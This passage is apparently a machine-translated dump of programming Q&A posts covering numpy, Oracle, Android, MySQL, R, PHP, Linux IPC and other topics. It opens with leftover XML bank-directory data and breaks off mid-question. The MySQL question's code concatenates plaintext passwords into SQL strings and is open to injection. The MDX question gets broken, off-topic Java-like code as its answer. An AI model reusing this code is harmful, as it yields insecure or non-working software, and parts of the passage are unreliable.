<BK><BankName>Exchange State Bank</BankName><BankType>BANKS</BankType><Established>Est. 1879</Established><RoutingNbr>0739-0680-1</RoutingNbr><Address1>322 Audubon</Address1><Hours>Hrs: M-TH 9-3 F 9-5</Hours><Address2>PO Box 98</Address2><Zip>50002-0098</Zip><Fax>FAX: (641) 742-3424</Fax><Phone>(641) 742-3201</Phone><WebURL>Web: www.esbanks.com</WebURL><HoldingCo>Exchange Financial Inc., Adair</HoldingCo><SubChapS>Yes</SubChapS><TotalAssets>51,817,000</TotalAssets><TotalLiabilities>46,937,000</TotalLiabilities><TotalDeposits>39,503,000</TotalDeposits><EquityCapital>4,880,000</EquityCapital><IBAGroup>5</IBAGroup><FDICNbr>18838</FDICNbr>
<EH><Employee>Charles J Gaffey, Pres, CEO</Employee></EH><EH><Employee>Kendall Kerns, EVP, RELO</Employee></EH><EH><Employee>Debra Lemke, VP, Cash</Employee></EH><EH><Employee>Lisa J Plowman, AVP, IT</Employee></EH><EH><Employee>Mel Jorgensen, COO</Employee></EH>
<D><DirectorLabel>Directors</DirectorLabel><Director>Harold Scholl, Rex Noland, W. Edward Littler, Jr., Forrest Schnobrich, Stan Kading, Chris Schafer, Charles Gaffey</Director></D>
<CB><CorrespondingBankLabel>Correspondent Banks</CorrespondingBankLabel><CorrespondingBank>FHLB, Des Moines; MIB, Jefferson City, MO</CorrespondingBank></CB>
<OFF><OfficeLabel>Office</OfficeLabel><Office>Winterset</Office></OFF>
</BK>
<BK><BankName>Rolling Hills Bank &amp; Trust</BankName><Address1>502 Broad Street</Address1><Zip>50002</Zip><Fax>FAX: (641) 742-3436</Fax><Phone>(641) 742-3432</Phone><OfficeOfLabel>Office of Rolling Hills Bank &amp; Trust, Atlantic</OfficeOfLabel>
<EH><Employee>Mary Beth Petty, VP, BM</Employee></EH>
</BK>
</CL>
<CL>
<CityDescription>ADEL, DALLAS CO.</CityDescription>
<Population>POP. 3682</Population>
<BK><BankName>Lincoln Savings Bank</BankName><BankType>BANKS</BankType><Address1>805 Main Street</Address1><Zip>50003</Zip><Fax>FAX: (515) 253-9502</Fax><OfficeOfLabel>Office of Lincoln Savings Bank, Reinbeck</OfficeOfLabel>
</BK>
<BK><BankName>Peoples Trust &amp; Savings Bank</BankName><Established>Est. 1917</Established><RoutingNbr>0739-1921-2</RoutingNbr><Address1>804 Greenwood Hills Dr</Address1><Hours>Hrs: M-F 9-4 Sat 9-12</Hours><Address2>PO Box 98</Address2><Zip>50003-0098</Zip><Fax>FAX: (515) 993-5681</Fax><Phone>(515) 993-5680</Phone><Email>e-Mail: info@ptsbank.com</Email><WebURL>Web: www.ptsbank.com</WebURL><OfficeOfLabel>Office of Peoples Trust &amp; Savings Bank, Clive</OfficeOfLabel>
<EH><Employee>Dean W Boettcher, EVP, Mkt Pres</Employee></EH><EH><Employee>Colby Dawes, VP</Employee></EH><EH><Employee>Doran T Ryan, VP</Employee></EH>
</BK>
<BK><BankName>Raccoon Valley Bank</BankName><Established>Est. 1914</Established><Address1>1009 Court St</Address1><Hours>Hrs: M-F 8-6  SAT 9-12</Hours><Zip>50003-1477</Zip><Fax>FAX: (515) 993-5127</Fax><Phone>(515) 993-4581</Phone><Email>e-Mail: roger-platz@raccoonvalleybank.com</Email><WebURL>Web: www.raccoonvalleybank.com</WebURL><OfficeOfLabel>Office of Raccoon Valley Bank, Perry</OfficeOfLabel>
<EH><Employee>Doug Zeigler, VP</Employee></EH><EH><Employee>Joan Barber, AC</Employee></EH>
</BK>
<BK><BankName>Wells Fargo Bank, N.A.</BankName><RoutingNbr>0730-0082-0</RoutingNbr><Address1>100 Nile Kinnick Drive</Address1><Zip>50003</Zip><Fax>FAX: (515) 993-4555</Fax><Phone>(515) 993-4551</Phone><OfficeOfLabel>Office of Wells Fargo Bank, N.A., Des Moines</OfficeOfLabel>
<EH><Employee>Brett A Smith, Dist. Mgr</Employee></EH>
</BK>
</CL>
</Story>
</Root> 
```

# python - 如何在没有循环的情况下分配给大矩阵中的方形子矩阵

> ID：10989102
> 
> 赞同：6
> 
> 时间：2012-06-12T00:19:04.807
> 
> 标签：python, numpy, vectorization

我如何向量化这个循环，它使用 numpy 数组填充更大矩阵的两个方形子矩阵（也保持更大的矩阵对称）：

```
for x in range(n):
    assert m[x].shape == (n,)
    M[i:i+n,j+x] = m[x]
    M[j+x,i:i+n] = m[x] 
```

这很诱人，但不同意上面的循环（参见下面的示例分歧）：

```
assert m.shape == (n,n)
M[i:i+n,j:j+n] = m
M[j:j+n,i:i+n] = m 
```

这是一个小例子（n>1 时崩溃）：

```
from numpy import arange,empty,NAN
from numpy.testing import assert_almost_equal

for n in (1,2,3,4):
    # make the submatrix
    m = (10 * arange(1, 1 + n * n)).reshape(n, n)

    N = n # example below, submatrix is the whole thing

    # M1 using loops, M2 "vectorized"
    M1 = empty((N, N))
    M2 = empty((N, N))
    M1.fill(NAN)
    M2.fill(NAN)

    i,j = 0,0 # not really used when (n == N)

    # this results in symmetric matrix
    for x in range(n):
        assert m[x].shape == (n,)
        M1[i:i+n,j+x] = m[x]
        M1[j+x,i:i+n] = m[x]

    # this does not work as expected
    M2[i:i+n,j:j+n] = m
    M2[j:j+n,i:i+n] = m

    assert_almost_equal(M1,M1.transpose(),err_msg="M not symmetric?")
    print "M1\n",M1,"\nM2",M2
    assert_almost_equal(M1,M2,err_msg="M1 (loop) disagrees with M2 (vectorized)") 
```

我们最终得到：

```
M1 = [10 30
      30 40] # symmetric

M2 = [10 20
      30 40] # i.e. m 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T01:03:24.623

您的测试不正确：对于 i,j=0,0 您的 M2[]= 分配只是覆盖相同的矩阵块。

使用 M1 时获得对称矩阵的原因是因为您在单个循环中分配 M1 值。

如果您将循环分成两部分：

```
for x in range(n):
      M1[i:i+n,j+x] = m[x]
for x in range(n): 
      M1[j+x,i:i+n] = m[x] 
```

M1 显然与 M2 相同。

总而言之，以下代码有效（相当于您的 M2 计算）但是！只有在对角线上方和下方的块之间没有重叠时，它才会起作用。如果有你必须决定在那里做什么

```
xs=np.arange(4).reshape(2,2)
ys=np.zeros((7,7))
ys[i:i+n,j:j+n]=xs
ys[j:j+n,i:i+n]=xs.T
print ys
>> array([[ 0.,  0.,  0.,  0.,  0.,  0.,  0.],
       [ 0.,  0.,  0.,  0.,  1.,  0.,  0.],
       [ 0.,  0.,  0.,  2.,  3.,  0.,  0.],
       [ 0.,  0.,  2.,  0.,  0.,  0.,  0.],
       [ 0.,  1.,  3.,  0.,  0.,  0.,  0.],
       [ 0.,  0.,  0.,  0.,  0.,  0.,  0.],
       [ 0.,  0.,  0.,  0.,  0.,  0.,  0.]]) 
```

# c# - 来自VS2010的oracle数据库连接

> ID：10989103
> 
> 赞同：0
> 
> 时间：2012-06-12T00:19:18.403
> 
> 标签：c#, asp.net, oracle, oracle11g

我可以在本地开发机器上的特定 Web 项目上成功执行以下代码..

```
 string cStr = @"data source=xxxxxxx;user id=xxxxx;password=xxxx;persist security info=false";
      using (OracleConnection oc = new OracleConnection(cStr))
      {
          oc.Open();
          oc.Close();

      } 
```

但是，如果我尝试在任何其他项目（Web、控制台、测试）中执行它，我会收到以下错误。

**OCIEnvCreate 失败，返回代码 -1，但错误消息文本不可用。**

我已经用谷歌搜索并浏览了这个网站，到目前为止所有的答案都没有帮助我。我真的需要帮助。所以请不要对这个问题投反对票。

这是我的开发机器设置...

Windows 7 企业服务包 1 64 位操作系统

Visual Studio 2010 企业服务包 1 IIS 版本 7.5

甲骨文版本 11.2.0

工作 Web 应用程序的目标是 .net 框架 4。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T14:46:49.163

问题是安装了多个 Oracle 客户端。

[请参阅TechnoEncode](http://tecnoencode.blogspot.com)的此页面

# android - 创建android库项目并使用生成的jar

> ID：10989104
> 
> 赞同：0
> 
> 时间：2012-06-12T00:19:21.417
> 
> 标签：android, jar

我正在尝试创建一个 android 库并在另一个项目中使用它。到目前为止，我能找到的参考资料是关于[android 文档](http://developer.android.com/guide/developing/projects/projects-eclipse.html)的。

但是，该文档仅教授如何创建 android 库并将项目引用到另一个项目。我想要实现的是类似于 google admob 的东西，我可以在其中引用 jar 版本。

我尝试使用取自的 jar，`$PROJECTDIR/bin/`但它会生成错误，提示`R`找不到该类。

有没有办法创建它？一些教程，也许？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T00:58:16.860

> 我想要实现的是类似于 google admob 的东西，我可以在其中引用 jar 版本。

该 JAR 中没有 Android 资源。

> 有没有办法创建它？

不是这个时候。支持将 Android 库项目打包为 JAR，包括资源，这是他们正在努力的事情，但还没有准备好。

# java - 具有重复支持的 MySQL INSERT

> ID：10989109
> 
> 赞同：1
> 
> 时间：2012-06-12T00:20:55.903
> 
> 标签：java, mysql

我正在尝试使用 MySQL 数据库来保存玩家信息，但只要有重复，它就会加载（或保存？）来自同一玩家列的每个玩家。

这是我正在使用的：

```
public boolean saveGame(String playerName, String playerPass) {
    String player = "'" + playerName + "', '" + playerPass + "'";
    String player2 = "`password` = '" + playerPass + "'";

    String playerData = "'" + playerName + "', 'testtttt'";
    String playerData2 = "`test` = 'testtttt'";

    Server.getConnectionPool().executeUpdate("INSERT INTO player (username, password) VALUES (" + player + ") ON duplicate KEY UPDATE " + player2);
    Server.getConnectionPool().executeUpdate("INSERT INTO playerdata (username, test) VALUES (" + playerData + ") ON duplicate KEY UPDATE " + playerData2);
    return true;
}

public int loadGame(String name, String pass) {
    ResultSet res = Server.getConnectionPool().executeQuery("SELECT * FROM player, playerdata WHERE player.username = '" + name + "'");
    try {
        name = res.getString("username");
        if (!pass.equalsIgnoreCase(res.getString("password"))) {
            return 3;
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
    return 1;
} 
```

这是模式（我从示例中删除了数据，因为它并不是真正需要的，无论如何它都不能正确加载/保存）：

播放器： [图片 http://puu.sh/Alit.png](http://puu.sh/Alit.png)

玩家数据： [图片 http://puu.sh/Aljr.png](http://puu.sh/Aljr.png)

我知道它们将是相同的，因为我对该`test`字段使用相同的字符串，但即使我在 PHPMyAdmin 中进行随机字符串或自定义编辑，它仍然会保存然后从同一列加载。我认为它正在保存，因为它似乎正确加载了播放器，它只是没有更新正确的列，我不知道该怎么做。在`playerdata`表格中，每个人的所有数据都是相同的，我不知道是什么原因造成的，有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T04:00:43.000

如果要在数据库中插入重复记录，请从两个表中删除主键（用户名）。不想插入重复记录，请使用 JDBC 事务。以下是示例用法；

```
 Server.getConnectionPool().setAutoCommit(false);
       Server.getConnectionPool().executeUpdate("INSERT INTO player (username, password) VALUES (" + player + ") ON duplicate KEY UPDATE " + player2);
       Server.getConnectionPool().executeUpdate("INSERT INTO playerdata (username, test) VALUES (" + playerData + ") ON duplicate KEY UPDATE " + playerData2);
       Server.getConnectionPool().commit(); 
```

详细用法可以[在这里](http://docs.oracle.com/javase/tutorial/jdbc/basics/transactions.html)学习。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T15:57:16.047

我已通过将加载查询更改为`SELECT * FROM player as p, playerdata as pd WHERE p.username = '" + name + "' AND pd.username = '" + name + "'`

# r - 标记一个闪避的条形图

> ID：10989110
> 
> 赞同：0
> 
> 时间：2012-06-12T00:20:57.667
> 
> 标签：r, ggplot2

也许是因为外面太黑了，但我看不到这个

[在闪避的条形图上定位 geom_text](https://stackoverflow.com/questions/6017460/ggplot-geom-text-with-dodged-barplot)

处理我相当简单的数据框

```
fs <- data.frame(productcategory=c("c2","c2"), product=c("p4", "p5"), ms1=c(2,1))

plot <- ggplot(data=NULL)
plot + 
    geom_bar(data=fs, aes(x=productcategory, y=ms1, weight=ms1, fill=product),stat="identity", position="dodge") + 
    geom_text(data=fs, aes(label = ms1,  x = productcategory, y=ms1+0.2), position=position_dodge(width=1))) 
```

我的情节仍然在产品类别的“中间”显示标签，而不是在正确产品的上方。

看起来像这样，即使它看起来很简单，但我完全坚持这个

因此，非常感谢任何提示如何在正确的条形上方获得标签。

汤姆

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T00:36:51.083

因为您为每个 geom 单独定义了美学，`geom_text`所以并没有意识到您将 x 变量`productcategory`除以 fill 变量这一事实`product`。

您可以通过添加`fill=product`到`aes()`调用来获得所需的图形`geom_text`，或者您可以尝试在原始调用中定义尽可能多的美学`ggplot()`，以便所有几何图形自动获取这些美学并且您只需要定义它们如果它们'特定于那个特定的几何。

```
plot2 <- ggplot(data=fs, aes(x=productcategory, y=ms1, fill=product)) +
  geom_bar(stat="identity", position="dodge") +
  geom_text(aes(label=ms1, y =ms1 + 0.2), position=position_dodge(width=1))
print(plot2) 
```

# objective-c - 用opengl绘制少于每一帧

> ID：10989115
> 
> 赞同：2
> 
> 时间：2012-06-12T00:21:26.767
> 
> 标签：objective-c, ios, cocos2d-iphone

他们有什么办法，在 cocos2d 中，通过 opengl 绘制 cclayer 的频率低于每一帧吗？我试过了：

```
-(void) draw
{
     glEnable(GL_LINE_SMOOTH);
     if (iShouldUpdate) {
         ccDrawLine(ccp(50,50), ccp(200,200));   
         iShouldUpdate = false;
     }
}

-(void) updateTheMap
{
     iShouldUpdate = true;
} 
```

然后在需要时调用：updateTheMap，但它只显示 1 帧。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-13T13:49:48.753

是和不是。

通常帧内容在新帧渲染之前被清除。每一帧都以干净的状态开始。现在，如果你要禁用清除屏幕，你可以画一次，它会留在屏幕上。但是，如果不完全清除您绘制的部分，您将无法移动您绘制的内容。

由于这变得非常复杂且非常容易出错，因此游戏的标准方式一直是游戏引擎在开始绘制新帧之前清除帧内容。一个值得注意的例外是 DooM，引擎开发人员假设屏幕上的每个像素都会在每一帧中更新 - 除非缺少纹理，在这种情况下你可以看到著名[的镜厅 (HOM) 效果](http://doom.wikia.com/wiki/Hall_of_mirrors_effect)，当你不是每帧都清除帧缓冲区：

![在此处输入图像描述](../Images/0cd50923d2e77aad424d5bc6890c23d2.png)

所以标准是每帧重新绘制整个屏幕内容。正因为如此，你不能每隔几帧就画一些东西，因为如果你这样做，那么你画的任何东西都会在一帧的屏幕上可见，然后它就会消失。

总而言之：您必须每帧重复绘制应在屏幕上可见的所有内容。这就是几乎所有游戏引擎的工作方式。

# android - bash 传递参数无效（adb）

> ID：10989119
> 
> 赞同：0
> 
> 时间：2012-06-12T00:22:17.117
> 
> 标签：android, linux, bash, shell, adb

对不起我的英语不好。我编写使用变量的 bash 文件：`shared_var=/system/xbin`

**我的脚本文件：**

```
exec="./adb shell chmod 644 $shared_var/$2"
echo $exec
$exec 
```

**让我们运行这个脚本：**

```
>bash gapp.sh misc su
./adb shell chmod 644 /system/xbin/su
: No such file or directory n/su 
```

**让我们在没有脚本的情况下运行字符串“./adb shell chmod 644 /system/xbin/su”：**

```
> ./adb shell chmod 644 /system/xbin/su
(No output, OK) 
```

我有几个问题：

1.  为什么终端中的脚本和直接输入有不同的结果？
2.  为什么不是“没有这样的文件或目录/system/xbin/su” adb 返回“没有 soch 文件或目录 n/su”（adb 结果看起来失真）
3.  我的问题的解决方案是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T00:37:26.183

如果你的 shell 脚本只有

```
echo ./adb shell chmod 644 $shared_var/$2
./adb shell chmod 644 $shared_var/$2 
```

即，不将其分配给另一个变量，并且没有带引号的字符串

此外，如果您在 Windows 中编辑文件，请确保使用`Unix`换行符保存文件。

# android - Android 4.0.3 上画布上的奇怪崩溃绘图。A/libc：致命信号 11 (SIGSEGV)

> ID：10989120
> 
> 赞同：6
> 
> 时间：2012-06-12T00:22:46.010
> 
> 标签：android, crash, paint, android-canvas, segmentation-fault

我正在使用搭载 Android 4.0.3 的低成本平板电脑。这里的日志：

```
06-11 23:36:04.653: D/SynopticElement(1583): Size changed to 200x200
06-11 23:36:04.693: D/dalvikvm(1583): GC_FOR_ALLOC freed 62K, 12% free 7275K/8199K, paused 33ms
06-11 23:36:04.713: D/SynopticElement(1583): Size changed to 190x190
06-11 23:36:04.733: D/dalvikvm(1583): GC_FOR_ALLOC freed 9K, 12% free 7583K/8583K, paused 22ms
06-11 23:36:04.743: A/libc(1583): Fatal signal 11 (SIGSEGV) at 0xc52c9d4c (code=1) 
```

调试我的代码：

```
canvas.scale(getWidth(), getWidth()); //I'm drawing a custom component

Paint frameBackgroundPainter = new Paint();
frameBackgroundPainter.setAntiAlias(true);
frameBackgroundPainter.setStyle(Paint.Style.FILL);
frameBackgroundPainter.setColor(0xff000000);

Paint frameBorderPainter = new Paint();
frameBorderPainter.setAntiAlias(true);
frameBorderPainter.setStrokeWidth(0.007f); //canvas is scaled
frameBorderPainter.setStyle(Paint.Style.STROKE);
frameBorderPainter.setColor(0xffaaaaaa);

RectF frameRect = getFrameBorder(); //simply get the Rect to draw on canvas
canvas.drawRect(frameRect, frameBackgroundPainter); //draw the background 

// ---> If I comment this line app does not crash!!!!! <---
canvas.drawRect(frameRect, frameBorderPainter); //draw the border 
```

**画笔宽度**有问题，我尝试了不同的值：

```
0.007f -> crash
0.009f -> crash
0.5f -> ok 
0.1f -> ok 
```

由于线宽的值非常低，有人可能会告诉我使用不同的画布比例：好的，但是如果我`width=0.007f`在 Android 2.3（平板电脑和手机）和 Android 3.0（平板电脑）上设置并运行该应用程序，一切正常。 ..

我没有提出任何以不同方式绘制边框的解决方案，我想知道是否有人知道这是否是 Android 4.0.3 的错误。

我还认为这可能是我的低成本平板电脑的图形硬件问题，不幸的是我没有其他 Android 4.0.3 设备可以进行测试......

我的标签指标：

```
DisplayMetrics{density=1.0, width=480, height=752, scaledDensity=1.0, xdpi=160.0, ydpi=160.42105} 
```

有关该设备的更多信息，请访问[此链接](http://www.epad.hk/Specs.asp?M=ZX07c)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-13T20:08:49.733

这是在 Intel x86 AVD 上停止 OpenGL-ES 应用程序时的常见错误（每次启动都会在 onStop() 处崩溃）。这是一个快速的解决方案： - 打开 AndroidManifest.xml，将 android:allowClearUserData="true" 标记添加到应用程序节点。

```
 `<application
            android:allowBackup="true"
            android:icon="@drawable/ic_launcher"
            android:label="@string/app_name"
            android:theme="@style/AppTheme"
            android:allowClearUserData="true" >` 
```

# php - 将 PHP 关联数组传递给 JavaScript 时出错

> ID：10989121
> 
> 赞同：2
> 
> 时间：2012-06-12T00:23:02.810
> 
> 标签：php, javascript, arrays, json

我正在尝试将此关联数组传递给 JavaScript：

```
Array ( [0] => Array ( [topicid] => 38 [topic] => Dad ) [1] => Array ( [topicid] => 6 [topic] => What did you eat? ) [2] => Array ( [topicid] => 4 [topic] => What have you done? ) [3] => Array ( [topicid] => 43 [topic] => He ) [4] => Array ( [topicid] => 28 [topic] => I doubt it ) [5] => Array ( [topicid] => 10 [topic] => What made you feel good ) [6] => Array ( [topicid] => 12 [topic] => Say to yourself ) [7] => Array ( [topicid] => 29 [topic] => I doubt myself ) ) 
```

在 PHP 文件中：

```
$topicsjson=json_encode($topics);
echo "<script>var topicsjson = $topicsjson; </script>"; 
```

在 JavaScript 文件中：

```
document.write(topicsjson); 
```

它给了我这个结果：

```
[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object] 
```

我在这里错过了什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T00:33:51.830

您的 PHP 生成 JavaScript，如下所示：

```
<script>var topicsjson = [{"topicid":38,"topic":"Dad"},{"topicid":6,"topic":"What did you eat?"},{"topicid":4},{"topic":"What have you done?"}]; </script> 
```

使用两个 for 循环来遍历`topicsjson`.

```
var length = topicsjson.length;
for (var i = 0; i < length; i++) {
    for (var key in topicsjson[i]) {
        document.write(key + ": " + topicsjson[i][key] + "<br/>");
    }
} 
```

**演示：** [jsFiddle](http://jsfiddle.net/8BqB5/1/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T00:26:09.970

试试这个：

```
document.write(topicsjson.toString()); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-12T00:28:48.223

你可以试试[这个例子](http://phpro.org/classes/PHP-Recursive-Array-To-XML-With-DOM.html)，转换成可以[从 Javascript](https://developer.mozilla.org/en/Parsing_and_serializing_XML)解析的 XML 。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-12T01:49:43.690

[使用来源，卢克](http://www.codinghorror.com/blog/2012/04/learn-to-read-the-source-luke.html)。不要用 . 读取变量的内容`document.write`。使用您选择的 Web 浏览器，在此行查看生成的 PHP 文件的源代码：

```
echo "<script>var topicsjson = $topicsjson; </script>"; 
```

# c - linux中的并行处理

> ID：10989122
> 
> 赞同：6
> 
> 时间：2012-06-12T00:23:07.197
> 
> 标签：c, linux, multithreading

我不确定如何在我正在编写的程序中处理异步任务，我希望更有经验的人至少可以为我指明正确的方向。

我在嵌入式 ARM 处理器上运行 Angstrom Linux。我的程序通过暴露的硬件 PWM 和 PTP 上的摄像头控制多个伺服系统。此外，它是从任意客户端（在本例中为 Android）获取命令的套接字守护程序。相机 PTP 很慢，我不想等待它完成任务，因为程序的其余部分需要响应。

我尝试过线程，但相机线程中的任何问题似乎都会杀死整个过程。理想情况下，我想自己送相机去做它的事情，当它完成时让主要功能知道。这是一种适当的分叉技术还是我不正确地实现了线程？

此外，我想远离大型二级库，以避免出现更多交叉编译问题。在此先感谢您的任何建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T01:19:16.960

您的问题听起来像是多进程的经典案例，与某种进程间通信 (IPC) 进行通信。

相机应该有自己的进程，如果那个进程死了，主进程应该没有问题。你甚至可以让`init(8)`进程管理摄像头进程；如果它因任何原因死亡，它可以自动重新启动进程。

您可以永久设置命名管道，然后相机进程可以在失败后重新启动时重新打开它。

以下是有关命名管道的一些文档：

[http://www.tldp.org/LDP/lpg/node15.html](http://www.tldp.org/LDP/lpg/node15.html)

我从维基百科页面找到了这个：

[http://en.wikipedia.org/wiki/Named_pipe](http://en.wikipedia.org/wiki/Named_pipe)

我搜索了 StackOverflow，发现了关于命名管道与套接字的讨论：

[IPC 性能：命名管道与套接字](https://stackoverflow.com/questions/1235958/ipc-performance-named-pipe-vs-socket)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T02:25:06.047

采用 steveha 回答的基本方法，但跳过 init(8) 和命名管道。

`fork()` a child containing your camera code and communicate through regular pipes or domain sockets. Code a signal handler for SIGCHLD in the parent.If the child dies interrogate the reasons why with the return code from `wait()`. If it died on its own then cleanup and restart it; if it ended normally do what is appropriate in that case. Communicate with the child through whichever IPC you end up choosing. This give you more control over the child than `init` and domain sockets or pipes, in particular, will make it easier to set up and communicate between parent and child than messing with the funky semantics of FIFOs.

Of course, if there is really problems with the camera code all you have really done is make the failures somewhat more manageable by not taking down the whole program. Ideally you should get the camera code to work flawlessly if that is within your power.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T02:33:13.503

> I've tried threads, but any problems in the camera thread seems to kill the whole process.

When you say kill the whole process, what actually happens?

I put it to you that you are better off debugging the above problem, than trying to wrap the bug away in a forked process. You would rather have a reliable system including a reliable camera, than a reliable core system with an unreliable camera.

# javascript - webkitmutationobserver 在 Safari 中不起作用？

> ID：10989123
> 
> 赞同：3
> 
> 时间：2012-06-12T00:23:26.557
> 
> 标签：javascript, safari, webkit

我需要监控一个元素的显示状态。我正在使用以下代码

```
if WebKitMutationObserver?
    observer = new WebKitMutationObserver observerFunc
    observer.observe el, {attributes:true}
  else
    el.addEventListener "DOMAttrModified",(event)->
      wrapper.style.display = el.style.display
      return 
```

但是，这在 Safari 中不起作用。

此外，在 Chrome 的开发人员工具即时窗口中键入“WebKitMutationObserver”会给出输出

```
function WebKitMutationObserver() { [native code] } 
```

在 Safari (v 5.1.7) 中，这会给出错误消息“找不到变量：WebKitMutationObserver”

难道是 Safari 不支持 WebkitMutationObserver？如果是这样，有没有我可以使用的替代方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T08:43:07.353

最新的 Safari (6.0) 确实包括`WebKitMutationObserver`. 对于较旧的 Safari，以下是我们使用的一些代码，`DOMAttrModified`当您使用`setAttribute`或`removeAttribute`更改属性时会伪造事件。请注意，如果浏览器本身在内部更改属性，这将不起作用。

```
 var win = window;
  var doc = win.document;
  var attrModifiedWorks = false;
  var listener = function () { attrModifiedWorks = true; };
  doc.documentElement.addEventListener("DOMAttrModified", listener, false);
  doc.documentElement.setAttribute("___TEST___", true);
  doc.documentElement.removeAttribute("___TEST___", true);
  doc.documentElement.removeEventListener("DOMAttrModified", listener, false);
  if (!attrModifiedWorks)
  {
    This.DOMAttrModifiedUnsupported = true;

    win.HTMLElement.prototype.__setAttribute = win.HTMLElement.prototype.setAttribute;
    win.HTMLElement.prototype.setAttribute = function fixDOMAttrModifiedSetAttr (attrName, newVal)
    {
      var prevVal = this.getAttribute(attrName);
      this.__setAttribute(attrName, newVal);
      newVal = this.getAttribute(attrName);
      if (newVal != prevVal)
      {
        var evt = doc.createEvent("MutationEvent");
        evt.initMutationEvent
          ( "DOMAttrModified"
          , true
          , false
          , this
          , prevVal || ""
          , newVal || ""
          , attrName
          , (prevVal == null) ? win.MutationEvent.ADDITION : win.MutationEvent.MODIFICATION
          );
        this.dispatchEvent(evt);
      }
    }

    win.HTMLElement.prototype.__removeAttribute = win.HTMLElement.prototype.removeAttribute;
    win.HTMLElement.prototype.removeAttribute = function fixDOMAttrModifiedRemoveAttr (attrName)
    {
      var prevVal = this.getAttribute(attrName);
      this.__removeAttribute(attrName);
      var evt = doc.createEvent("MutationEvent");
      evt.initMutationEvent("DOMAttrModified", true, false, this, prevVal, "", attrName, win.MutationEvent.REMOVAL);
      this.dispatchEvent(evt);
    }
  }
} 
```

# cakephp-2.0 - cakephp 错误：无法加载类 WidgetShell

> ID：10989125
> 
> 赞同：0
> 
> 时间：2012-06-12T00:23:41.093
> 
> 标签：cakephp-2.0

我使用的是 CakePHP 2.0，我的命令行 cake 设置如下。令人惊讶的是，该命令在windwos环境中运行良好

```
App : app
Path : /var/www/qa/app/ 
```

当前路径：

```
 -app: app
 -working: /var/www/qa/app
 -root: /var/www/qa
 -core: /var/www/qa/lib 
```

可用的外壳：

```
 acl [CORE]                             i18n [CORE]
 acl_extras [AclExtras]                 schema [CORE]
 api [CORE]                             template [app]
 bake [CORE]                            testsuite [CORE]
 command_list [CORE]                    upgrade [CORE]
 console [CORE]                         widget [app] 
```

我可以看到上面列出的小部件 [app] shell 命令

**当我运行以下命令时**

* * *

> webtools@local:/var/www/qa/app$ ./Console/cake 小部件

错误：找不到 Shell 类 WidgetShell。

```
#0 /var/www/qa/lib/Cake/Console/ShellDispatcher.php(167): ShellDispatcher >_getShell('widget')
#1 /var/www/qa/lib/Cake/Console/ShellDispatcher.php(69): ShellDispatcher->dispatch()
#2 /var/www/qa/app/Console/cake.php(41): ShellDispatcher::run(Array)
#3 {main}
#3 {main} 
```

可能是什么问题呢。[我已经在论坛](https://stackoverflow.com/questions/10671634/cakephp-shell-shell-class-helloshell-could-not-be-found)中经历了所有类似的问题！我找不到答案。

我真的很感谢你在这方面的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T18:04:08.607

这真有趣。我将文件命名为“Widget.php”。它在 Windows 中运行良好。但在 Linux/Mac 中却没有。

我将文件名更改为“WidgetShell.php”，它开始工作。我应该早一点注意到这个问题，花了很多时间；）

# mdx - 我如何创建一个计算的度量，它将按逾期天数过滤数据

> ID：10989134
> 
> 赞同：-1
> 
> 时间：2012-06-12T00:24:46.790
> 
> 标签：mdx

我的事实表中有一个字段称为逾期天数。我想创建一个将执行以下操作的集合：如果到期天数介于 0 - 29 之间，则逾期 0 - 29 天，如果介于 30 至 59 天之间，则逾期 30 - 59 天。我将如何创建这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:11:32.930

我们需要知道您使用的是哪种数组，或者链表，或者我最喜欢这些东西，向量等。

如果您使用的是向量，您将创建自己的类以用作数据类型，例如：

```
Class MyData
{
    String name;
    int daysPastDue; // how you want to factor this is up to you, 
                       // i suggest looking into Java.util.date or Java.util.calendar 
    public MyData
    {
         name = "";
         daysPastDue = 0;
    }
}

Class DoWork
{

public void myWork() // excuse the indent, forgot to put in the class name
{
    vector <MyData> input;
    MyData 0To29 [] = new MyData[input.size()];
    MyData 33To59 [] = new MyData[input.size()];
    MyData item = new MyData();
    int 0To29count = 0;
    int 30To59count = 0; 
    for (i = 0; i <= list.size(); i++)
    {
        item = input.elementAt(i)
        if (item.daysPastDue <= 29)
        {
            0To29[0To29Count] = input;
            0To29Count ++;
        }
        elseif (item.daysPastDue >= 30 && item.daysPastDue <= 59)
        {
            30To59[30To59Count] = input;
            30To59Count ++;
        }
    }
}
} 
```

然后你有你的 2 个数组，可以根据需要输出它们。但是我建议从 daysPastDue = 100000 开始并递减它并通过向量检查数字，直到列出向量中的所有项目。这样一来，它们都按从最迟到最少的顺序排列，并且您可以准确地得到它们已经逾期多长时间的输出。

# c++ - 创建部分模板特化会引发错误

> ID：10989140
> 
> 赞同：0
> 
> 时间：2012-06-12T00:25:07.997
> 
> 标签：c++, templates

我有一个示例类，如果该类属于某种类型，我需要在其中专门化 Print 函数。但这根本无法编译。

```
template <typename classType, int size>
class MyVector
    {
    public:
        classType* innerArray;
        MyVector(){innerArray = new classType[size];}
        ~MyVector(){delete[] innerArray;}

        void push_back(classType val)
            {
            innerArray[0] = val;
            }

        classType& operator[](int index)
            {
            assert(index >= 0);
            return innerArray[index];
            }

        void Print() {
